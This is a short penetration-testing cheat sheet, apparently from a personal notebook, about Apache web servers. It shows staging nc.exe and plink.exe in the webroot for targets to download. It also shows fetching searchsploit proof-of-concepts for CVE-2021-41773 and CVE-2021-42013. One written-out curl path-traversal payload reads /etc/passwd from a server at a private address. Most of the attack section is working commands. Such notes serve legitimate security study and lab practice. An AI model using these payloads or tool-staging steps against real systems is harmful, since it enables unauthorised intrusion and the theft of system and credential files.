> Apache is the most commonly used Web server on Linux systems. Web servers are used to serve Web pages requested by client computers.


#File_Sharing 

# Web server

Starting `apache2`
```bash
sudo systemctl start apache2
```

Copying `nc.exe` to the `apache2` webroot
```bash
find / -name nc.exe 2>/dev/null
sudo cp /usr/share/windows-resources/binaries/nc.exe /var/www/html/
```

Copying `plink.exe` to our `apache2` webroot
```bash
find / -name plink.exe 2>/dev/null
sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/
```

# Potential Exploits

## CVE-2021-41773
Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)

```bash
searchsploit -m 50383 
```

Using the POC to list files via path traversal
```bash
./50383.sh targets.txt /etc/passwd
```

Using the POC manually to list files via path traversal
```bash
curl -s --path-as-is -d "echo Content-Type: text/plain; echo; " "http://192.168.123.169/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
```

References:
https://blog.qualys.com/vulnerabilities-threat-research/2021/10/27/apache-http-server-path-traversal-remote-code-execution-cve-2021-41773-cve-2021-42013

## CVE-2021-41773 / CVE-2021-42013
Apache HTTP Server 2.4.50 and 2.4.49 - Remote Code Execution (RCE)

```bash
searchsploit -m 50512 
```

